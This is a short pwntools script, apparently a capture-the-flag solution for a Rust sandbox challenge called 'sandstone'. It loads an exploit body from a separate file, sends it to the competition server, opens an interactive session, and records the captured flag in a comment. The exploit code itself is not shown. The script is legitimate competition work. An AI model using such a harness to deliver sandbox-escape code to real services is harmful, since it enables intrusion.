#!/usr/bin/env python2

from pwn import *

SRC = ""
with open("sploit.rs") as f:
    started = False
    for ln in f:
        if started:
            SRC += ln
        if "SPLOIT BEGIN" in ln:
            started = True
        if "SPLOIT END" in ln:
            break

def main():
    #with process("target/release/sandbox-sandstone") as t:
    with remote("sandstone.ctfcompetition.com", 1337) as t:
        t.sendline(SRC)
        t.sendline("EOF")
        t.interactive()

# Flag:
# CTF{InT3ndEd_8yP45_w45_g1tHu8_c0m_Ru5t_l4Ng_Ru5t_1ssue5_31287}

if __name__ == "__main__":
    main()
